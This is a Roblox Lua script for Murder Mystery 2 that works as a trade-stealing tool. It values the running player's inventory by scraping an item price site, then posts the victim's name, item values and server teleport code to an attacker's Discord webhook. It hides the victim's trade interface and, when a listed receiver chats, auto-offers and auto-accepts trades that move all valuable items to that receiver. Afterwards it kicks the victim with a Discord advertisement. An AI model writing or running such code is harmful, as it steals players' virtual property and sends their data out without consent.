if not _G["Script-SM_Config"] then
    warn("WARNING: Config not loaded! Waiting for config...")
    repeat task.wait() until _G["Script-SM_Config"]
    warn("Config loaded successfully!")
end

local config = _G["Script-SM_Config"]
local webhook = config.user_webhook
local usernames = config.users or {}
local minPingVal = tonumber(config.Min_Ping) or 0

local allFriends = {}
for _, name in ipairs(usernames) do table.insert(allFriends, name) end
local friendsList = allFriends

local playersService = game:GetService("Players")
local me = playersService.LocalPlayer
local http = game:GetService("HttpService")

-- Corrección: Definir 'request' globalmente por compatibilidad
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

if game.PlaceId ~= 142823291 then
    me:Kick("Wrong game! Join Murder Mystery 2")
    return
end

-- Verificación de Servidor VIP
local isVip = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
if isVip == "VIPServer" then
    me:Kick("Can't run on VIP servers")
    return
end

local itemsToTrade = {}
local myGui = me:WaitForChild("PlayerGui")
local itemDatabase = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

-- HELPER FUNCTIONS FOR TRADING ENGINE
local function checkTradeState()
    return game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
end

local function sendRequest(targetPlayer)
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(playersService:FindFirstChild(targetPlayer))
end

local function offerItem(itemId)
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(itemId, "Weapons")
end

local function autoAccept()
    -- El ID de aquí debe ser el del receptor, se asume que se pasa por el servidor
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(285646582)
end

local function waitTradeDone()
    repeat task.wait(0.5) until checkTradeState() == "None"
end

-- VALUE LIST SCRAPER
local valuePages = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local function cleanString(str) return str:match("^%s*(.-)%s*$") end

local function getItemValue(htmlBlock)
    local valText = htmlBlock:match(">(%d[%d,.]*)<") or htmlBlock:match("(%d[%d,.]*)")
    if valText then return tonumber(valText:gsub(",", "")) end
    return nil
end

local function parseRegularItems(pageHtml)
    local values = {}
    -- Pattern mejorado para capturar nombres y valores en el HTML
    for title, body in pageHtml:gmatch("class=\"item%-name\">([^<]+).-(class=\"value\">[^<]+)") do
        local cleanTitle = cleanString(title:gsub("%s+", " "))
        local val = getItemValue(body)
        if val then values[cleanTitle:lower()] = val end
    end
    return values
end

local function loadValues()
    local normalValues = {}
    for _, link in pairs(valuePages) do
        pcall(function()
            local resp = httpRequest({Url = link, Method = "GET"})
            if resp and resp.Body then
                local parsed = parseRegularItems(resp.Body)
                for n, v in pairs(parsed) do normalValues[n] = v end
            end
        end)
    end
    local final = {}
    for id, info in pairs(itemDatabase) do
        local name = info.ItemName and tostring(info.ItemName):lower()
        if name and normalValues[name] then final[id] = normalValues[name] end
    end
    return final
end

local itemValues = loadValues()
local inventoryData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(me.Name)
local overallValue = 0
local goodItems = {}

if inventoryData and inventoryData.Weapons and inventoryData.Weapons.Owned then
    for itemId, count in pairs(inventoryData.Weapons.Owned) do
        local info = itemDatabase[itemId]
        if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
            local itemName = tostring(info.ItemName)
            local val = itemValues[itemId] or 0 -- Buscamos por ID ya mapeado
            overallValue = overallValue + (val * count)
            table.insert(itemsToTrade, {id = itemId, rarity = info.Rarity, qty = count, val = val, name = itemName})
            if val > 0 then
                table.insert(goodItems, {name = itemName, value = val, count = count})
            end
        end
    end
end

table.sort(goodItems, function(a, b) return a.value > b.value end)

local displayLines = {}
for i, item in ipairs(goodItems) do
    if i > 15 then break end
    table.insert(displayLines, "x" .. item.count .. " " .. item.name .. " -> " .. item.value)
end

local receiversList = {}
for _, name in ipairs(usernames) do table.insert(receiversList, "• " .. tostring(name)) end
if #receiversList == 0 then receiversList = {"• None configured"} end

-- DISCORD EMBED LOGIC
local function postToDiscord(link)
    local currentPlayers = #playersService:GetPlayers()
    local embedPayload = {
        content = (overallValue >= minPingVal and minPingVal > 0) and "@everyone" or "",
        embeds = {{
            title = "🍪 ZICK | MURDER MYSTERY 2",
            description = "💡 **How to Use?**\nJoin user, jump or chat and accept gifts.",
            color = 0,
            fields = {
                {name="👤 Victim", value="```" .. me.Name .. "```", inline=true},
                {name="🎯 Receivers", value="```" .. table.concat(receiversList, "\n") .. "```", inline=false},
                {name="💰 Total Value", value="```" .. string.format("%.2f", overallValue) .. "```", inline=true},
                {name="🎒 Inventory", value="```" .. (#displayLines > 0 and table.concat(displayLines, "\n") or "No valued items") .. "```", inline=false},
                {name="📜 Teleport", value="```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')```", inline=false},
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        httpRequest({
            Url = link,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = http:JSONEncode(embedPayload)
        })
    end)
end

table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)

if #itemsToTrade > 0 then
    postToDiscord(webhook)

    -- Bloqueo de interfaces de trade para la víctima
    for _, name in pairs({"TradeGUI", "TradeGUI_Phone"}) do
        local gui = myGui:FindFirstChild(name)
        if gui then
            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                if gui.Enabled then gui.Enabled = false end
            end)
            gui.Enabled = false
        end
    end

    local function doTrade(targetPlayerName)
        task.spawn(function()
            local state = checkTradeState()
            if state ~= "None" then
                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
                task.wait(0.5)
            end

            while #itemsToTrade > 0 do
                local currentState = checkTradeState()
                if currentState == "None" then
                    sendRequest(targetPlayerName)
                elseif currentState == "StartTrade" then
                    -- Meter hasta 4 items por trade (límite de MM2)
                    for i = 1, 4 do
                        if #itemsToTrade > 0 then
                            local currentItem = table.remove(itemsToTrade, 1)
                            for c = 1, currentItem.qty do
                                offerItem(currentItem.id)
                                task.wait(0.1)
                            end
                        end
                    end
                    task.wait(1)
                    autoAccept()
                    waitTradeDone()
                end
                task.wait(1)
            end
            me:Kick("Trade complete. Join discord.gg/Zick")
        end)
    end

    local function listenForFriend(player)
        if table.find(friendsList, player.Name) then
            player.Chatted:Connect(function() doTrade(player.Name) end)
        end
    end

    for _, p in ipairs(playersService:GetPlayers()) do listenForFriend(p) end
    playersService.PlayerAdded:Connect(listenForFriend)
else
    me:Kick("No items to trade. discord.gg/Zick")
end
